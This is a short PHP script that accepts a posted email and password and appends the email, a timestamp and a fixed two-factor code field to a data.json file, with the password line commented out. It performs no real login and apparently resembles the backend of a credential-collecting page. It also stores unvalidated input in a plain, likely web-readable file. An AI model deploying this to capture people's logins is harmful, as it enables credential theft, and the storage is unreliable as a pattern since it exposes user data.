<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = json_decode(file_get_contents("php://input"), true);

    if (isset($data['email']) && isset($data['password'])) {
        $userData = [
            'email' => $data['email'],
            // 'password' => $data['password'],
            'timestamp' => date("Y-m-d H:i:s"),
            'twofacode' => 100
        ];

        // Save to data.json
        $file = 'data.json';
        $currentData = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
        $currentData[] = $userData;
        
        if (file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT))) {
            echo json_encode(["success" => true]);
        } else {
            echo json_encode(["success" => false]);
        }
    } else {
        echo json_encode(["success" => false]);
    }
}
?>
